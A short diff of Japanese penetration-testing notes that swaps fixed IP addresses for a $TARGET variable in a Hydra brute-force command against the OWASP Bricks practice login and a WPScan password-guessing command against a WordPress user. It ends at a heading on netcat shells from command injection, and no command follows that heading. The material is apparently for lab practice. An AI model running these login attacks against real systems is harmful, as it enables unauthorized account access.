@@ -7,13 +7,13 @@
 https://github.com/vanhauser-thc/thc-hydra
 
 ```shell
-hydra <targetIP> http-post-form "/owaspbricks/login-3/index.php:username=^USER^&password=^PASS^&Login=submit:Wrong user name or password." -L http_default_users.txt -P http_default_pass.txt
+hydra $TARGET http-post-form "/owaspbricks/login-3/index.php:username=^USER^&password=^PASS^&Login=submit:Wrong user name or password." -L http_default_users.txt -P http_default_pass.txt
 ```
 
 ### WordPress 専用のセキュリティスキャナ
 
 ```shell
-wpscan --url 192.168.11.16 --passwords password.txt --usernames elliot
+wpscan --url $TARGET --passwords password.txt --usernames elliot
 ```
 
 ## コマンドインジェクション（netcat でシェルを起動）
